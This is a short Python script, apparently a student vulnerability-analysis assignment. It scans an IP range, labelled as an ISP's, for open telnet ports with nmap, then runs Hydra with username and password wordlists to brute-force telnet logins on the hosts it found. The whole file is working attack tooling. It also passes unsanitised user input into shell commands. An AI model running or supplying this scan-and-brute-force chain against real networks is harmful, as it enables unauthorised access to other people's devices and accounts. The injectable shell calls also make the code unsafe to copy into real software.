#!/usr/bin/env python
'''
Jonathan Perez Guzman
Analisis de vulnerabilidades II
Escaneo de red
Python version = 3.10
'''
import sys, os
import subprocess as sp
import re


os.system('clear')
print("Escaneo ISP reduno")
option_menu = input("1.- Escanear red \n2.- Cargar archivo de texto y buscar vulnerabilidades con Hydra\n")
clear_screen = sp.call(["clear"], shell = True)

match option_menu:
    case "1":
        scan_ip = input("Introduce la direccion IP a escanear: ")
        text_file_name = re.sub("(\-)|(/)", "_", scan_ip)
        cmd = (f'nmap -p 23 {scan_ip} --open -Pn -oG - | grep "/open" | awk \'{{print $2}}\' > {text_file_name}_resultados.txt')
        scan_ip_result = sp.call([cmd], shell = True)
        clear_screen = sp.call(["clear"], shell = True)
        print(f"{text_file_name}_resultados.txt creado en {os.getcwd()}")

    case "2":
        show_files = sp.run(['ls', '-l'], shell = True)
        file_name = input("Nombre del archivo: ")
        clear_screen = sp.call(["clear"], shell = True)
        clear_screen = sp.call(["clear"], shell = True)
        print("[NOTA] LOS ARCHIVOS POR DEFAULT SON USER.TXT Y PASS.TXT\n")
        hydra_attack_cmd = (f'hydra -V -L user.txt -P pass.txt -t 1 -M {file_name} telnet')
        hydra_attack = sp.call([hydra_attack_cmd], shell = True)

